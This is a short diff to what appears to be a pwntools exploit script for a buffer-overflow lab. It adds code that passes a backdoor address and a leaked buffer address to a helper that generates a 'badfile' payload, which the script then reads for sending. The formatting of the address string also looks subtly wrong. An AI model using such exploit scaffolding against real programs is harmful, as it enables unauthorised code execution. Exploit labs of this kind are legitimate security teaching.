@@ -1,4 +1,6 @@
 from pwn import *
+import os
+import subprocess
 
 # context.terminal = ['tmux', 'split', '-h']   # for debug
 # context.log_level = 'debug'
@@ -16,6 +18,9 @@ p.info('local buf address: 0x%x', addr)
 
 # p.recvuntil('name? ')
 # payload = input()
+input = f'0x{hex(bdoor)} 0x{hex(addr)}'.encode('utf-8')
+print('input=', input)
+subprocess.run('./gen_badfile', input=input);
 with open("./badfile", "rb") as f:
     payload = f.readline()
 
